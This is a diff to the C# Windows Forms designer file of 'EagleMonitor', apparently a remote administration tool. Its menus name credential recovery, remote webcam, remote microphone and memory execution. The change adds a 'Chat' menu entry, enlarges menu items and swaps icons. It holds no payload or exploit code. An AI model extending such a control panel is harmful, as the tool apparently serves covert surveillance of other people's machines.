@@ -65,6 +65,7 @@
             this.remoteDesktopToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.remoteWebcamToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.remoteMicrophoneToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.chatToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.miscealleToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.massTaskToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
             this.memoryExecutionToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
@@ -317,10 +318,11 @@
             // clientCustomContextMenuStrip
             // 
             this.clientCustomContextMenuStrip.Font = new System.Drawing.Font("Segoe UI", 8.25F);
-            this.clientCustomContextMenuStrip.ImageScalingSize = new System.Drawing.Size(28, 28);
+            this.clientCustomContextMenuStrip.ImageScalingSize = new System.Drawing.Size(32, 32);
             this.clientCustomContextMenuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
             this.toolStripMenuItem1,
             this.toolStripMenuItem2,
+            this.chatToolStripMenuItem,
             this.miscealleToolStripMenuItem,
             this.massTaskToolStripMenuItem1,
             this.memoryExecutionToolStripMenuItem1,
@@ -330,7 +332,7 @@
             this.test123ToolStripMenuItem,
             this.test456ToolStripMenuItem});
             this.clientCustomContextMenuStrip.Name = "customContextMenuStrip1";
-            this.clientCustomContextMenuStrip.Size = new System.Drawing.Size(191, 344);
+            this.clientCustomContextMenuStrip.Size = new System.Drawing.Size(197, 444);
             // 
             // toolStripMenuItem1
             // 
@@ -339,7 +341,7 @@
             this.toolStripMenuItem1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(230)))), ((int)(((byte)(230)))), ((int)(((byte)(230)))));
             this.toolStripMenuItem1.Image = global::EagleMonitor.Properties.Resources.server_database_2x;
             this.toolStripMenuItem1.Name = "toolStripMenuItem1";
-            this.toolStripMenuItem1.Size = new System.Drawing.Size(190, 34);
+            this.toolStripMenuItem1.Size = new System.Drawing.Size(196, 38);
             this.toolStripMenuItem1.Text = "Recovery";
             // 
             // recoveryContextMenuStrip
@@ -403,7 +405,7 @@
             this.toolStripMenuItem2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(230)))), ((int)(((byte)(230)))), ((int)(((byte)(230)))));
             this.toolStripMenuItem2.Image = global::EagleMonitor.Properties.Resources.computer_network_wireless_green_2x1;
             this.toolStripMenuItem2.Name = "toolStripMenuItem2";
-            this.toolStripMenuItem2.Size = new System.Drawing.Size(190, 34);
+            this.toolStripMenuItem2.Size = new System.Drawing.Size(196, 38);
             this.toolStripMenuItem2.Text = "Desktop";
             // 
             // desktopContextMenuStrip
@@ -418,14 +420,13 @@
             this.remoteWebcamToolStripMenuItem,
             this.remoteMicrophoneToolStripMenuItem});
             this.desktopContextMenuStrip.Name = "customContextMenuStrip1";
-            this.desktopContextMenuStrip.OwnerItem = this.toolStripMenuItem2;
             this.desktopContextMenuStrip.Size = new System.Drawing.Size(192, 208);
             // 
             // fileManagerToolStripMenuItem
             // 
             this.fileManagerToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
             this.fileManagerToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(230)))), ((int)(((byte)(230)))), ((int)(((byte)(230)))));
-            this.fileManagerToolStripMenuItem.Image = global::EagleMonitor.Properties.Resources.folder_network_2x;
+            this.fileManagerToolStripMenuItem.Image = global::EagleMonitor.Properties.Resources.imageres_1023;
             this.fileManagerToolStripMenuItem.Name = "fileManagerToolStripMenuItem";
             this.fileManagerToolStripMenuItem.Size = new System.Drawing.Size(191, 34);
             this.fileManagerToolStripMenuItem.Text = "File Manager";
@@ -435,7 +436,7 @@
             // 
             this.processManagerToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
             this.processManagerToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(230)))), ((int)(((byte)(230)))), ((int)(((byte)(230)))));
-            this.processManagerToolStripMenuItem.Image = global::EagleMonitor.Properties.Resources.processes_2x;
+            this.processManagerToolStripMenuItem.Image = global::EagleMonitor.Properties.Resources.imageres_150;
             this.processManagerToolStripMenuItem.Name = "processManagerToolStripMenuItem";
             this.processManagerToolStripMenuItem.Size = new System.Drawing.Size(191, 34);
             this.processManagerToolStripMenuItem.Text = "Process Manager";
@@ -481,13 +482,23 @@
             this.remoteMicrophoneToolStripMenuItem.Text = "Remote Microphone";
             this.remoteMicrophoneToolStripMenuItem.Click += new System.EventHandler(this.remoteMicrophoneToolStripMenuItem_Click);
             // 
+            // chatToolStripMenuItem
+            // 
+            this.chatToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
+            this.chatToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(230)))), ((int)(((byte)(230)))), ((int)(((byte)(230)))));
+            this.chatToolStripMenuItem.Image = global::EagleMonitor.Properties.Resources.chat_large_2x;
+            this.chatToolStripMenuItem.Name = "chatToolStripMenuItem";
+            this.chatToolStripMenuItem.Size = new System.Drawing.Size(196, 38);
+            this.chatToolStripMenuItem.Text = "Chat";
+            this.chatToolStripMenuItem.Click += new System.EventHandler(this.chatToolStripMenuItem_Click);
+            // 
             // miscealleToolStripMenuItem
             // 
             this.miscealleToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
             this.miscealleToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(230)))), ((int)(((byte)(230)))), ((int)(((byte)(230)))));
             this.miscealleToolStripMenuItem.Image = global::EagleMonitor.Properties.Resources.alarm_central_unit_2x;
             this.miscealleToolStripMenuItem.Name = "miscealleToolStripMenuItem";
-            this.miscealleToolStripMenuItem.Size = new System.Drawing.Size(190, 34);
+            this.miscealleToolStripMenuItem.Size = new System.Drawing.Size(196, 38);
             this.miscealleToolStripMenuItem.Text = "Miscellaneous Panel";
             this.miscealleToolStripMenuItem.Click += new System.EventHandler(this.miscealleToolStripMenuItem_Click);
             // 
@@ -497,7 +508,7 @@
             this.massTaskToolStripMenuItem1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(230)))), ((int)(((byte)(230)))), ((int)(((byte)(230)))));
             this.massTaskToolStripMenuItem1.Image = global::EagleMonitor.Properties.Resources.big_data_people_2x;
             this.massTaskToolStripMenuItem1.Name = "massTaskToolStripMenuItem1";
-            this.massTaskToolStripMenuItem1.Size = new System.Drawing.Size(190, 34);
+            this.massTaskToolStripMenuItem1.Size = new System.Drawing.Size(196, 38);
             this.massTaskToolStripMenuItem1.Text = "Mass Task";
             this.massTaskToolStripMenuItem1.Click += new System.EventHandler(this.massTaskToolStripMenuItem1_Click);
             // 
@@ -507,7 +518,7 @@
             this.memoryExecutionToolStripMenuItem1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(230)))), ((int)(((byte)(230)))), ((int)(((byte)(230)))));
             this.memoryExecutionToolStripMenuItem1.Image = global::EagleMonitor.Properties.Resources.memory_2x;
             this.memoryExecutionToolStripMenuItem1.Name = "memoryExecutionToolStripMenuItem1";
-            this.memoryExecutionToolStripMenuItem1.Size = new System.Drawing.Size(190, 34);
+            this.memoryExecutionToolStripMenuItem1.Size = new System.Drawing.Size(196, 38);
             this.memoryExecutionToolStripMenuItem1.Text = "Memory Execution";
             this.memoryExecutionToolStripMenuItem1.Click += new System.EventHandler(this.memoryExecutionToolStripMenuItem1_Click);
             // 
@@ -517,7 +528,7 @@
             this.informationToolStripMenuItem1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(230)))), ((int)(((byte)(230)))), ((int)(((byte)(230)))));
             this.informationToolStripMenuItem1.Image = global::EagleMonitor.Properties.Resources.button_info_2x;
             this.informationToolStripMenuItem1.Name = "informationToolStripMenuItem1";
-            this.informationToolStripMenuItem1.Size = new System.Drawing.Size(190, 34);
+            this.informationToolStripMenuItem1.Size = new System.Drawing.Size(196, 38);
             this.informationToolStripMenuItem1.Text = "Information";
             this.informationToolStripMenuItem1.Click += new System.EventHandler(this.informationToolStripMenuItem1_Click);
             // 
@@ -528,7 +539,7 @@
             this.clientToolStripMenuItem1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(230)))), ((int)(((byte)(230)))), ((int)(((byte)(230)))));
             this.clientToolStripMenuItem1.Image = global::EagleMonitor.Properties.Resources.user_network_2x;
             this.clientToolStripMenuItem1.Name = "clientToolStripMenuItem1";
-            this.clientToolStripMenuItem1.Size = new System.Drawing.Size(190, 34);
+            this.clientToolStripMenuItem1.Size = new System.Drawing.Size(196, 38);
             this.clientToolStripMenuItem1.Text = "Client";
             // 
             // clientContextMenuStrip
@@ -540,7 +551,6 @@
             this.uninstallToolStripMenuItem,
             this.powerToolStripMenuItem});
             this.clientContextMenuStrip.Name = "customContextMenuStrip1";
-            this.clientContextMenuStrip.OwnerItem = this.clientToolStripMenuItem1;
             this.clientContextMenuStrip.Size = new System.Drawing.Size(133, 106);
             // 
             // closeStripMenuItem
@@ -586,7 +596,6 @@
             this.hibernateToolStripMenuItem,
             this.suspendToolStripMenuItem});
             this.powerContextMenuStrip.Name = "customContextMenuStrip1";
-            this.powerContextMenuStrip.OwnerItem = this.powerToolStripMenuItem;
             this.powerContextMenuStrip.Size = new System.Drawing.Size(177, 242);
             // 
             // shutdownToolStripMenuItem
@@ -665,7 +674,7 @@
             this.aboutToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(230)))), ((int)(((byte)(230)))), ((int)(((byte)(230)))));
             this.aboutToolStripMenuItem.Image = global::EagleMonitor.Properties.Resources.button_help_2x;
             this.aboutToolStripMenuItem.Name = "aboutToolStripMenuItem";
-            this.aboutToolStripMenuItem.Size = new System.Drawing.Size(190, 34);
+            this.aboutToolStripMenuItem.Size = new System.Drawing.Size(196, 38);
             this.aboutToolStripMenuItem.Text = "About";
             this.aboutToolStripMenuItem.Click += new System.EventHandler(this.aboutToolStripMenuItem_Click);
             // 
@@ -674,7 +683,7 @@
             this.test123ToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
             this.test123ToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(230)))), ((int)(((byte)(230)))), ((int)(((byte)(230)))));
             this.test123ToolStripMenuItem.Name = "test123ToolStripMenuItem";
-            this.test123ToolStripMenuItem.Size = new System.Drawing.Size(190, 34);
+            this.test123ToolStripMenuItem.Size = new System.Drawing.Size(196, 38);
             this.test123ToolStripMenuItem.Text = "Test123";
             this.test123ToolStripMenuItem.Visible = false;
             this.test123ToolStripMenuItem.Click += new System.EventHandler(this.test123ToolStripMenuItem_Click);
@@ -684,7 +693,7 @@
             this.test456ToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
             this.test456ToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(230)))), ((int)(((byte)(230)))), ((int)(((byte)(230)))));
             this.test456ToolStripMenuItem.Name = "test456ToolStripMenuItem";
-            this.test456ToolStripMenuItem.Size = new System.Drawing.Size(190, 34);
+            this.test456ToolStripMenuItem.Size = new System.Drawing.Size(196, 38);
             this.test456ToolStripMenuItem.Text = "Test456";
             this.test456ToolStripMenuItem.Visible = false;
             this.test456ToolStripMenuItem.Click += new System.EventHandler(this.test456ToolStripMenuItem_Click);
@@ -908,6 +917,7 @@
         private System.Windows.Forms.ToolStripMenuItem autofillToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem keywordsToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem remoteMicrophoneToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem chatToolStripMenuItem;
     }
 }
 
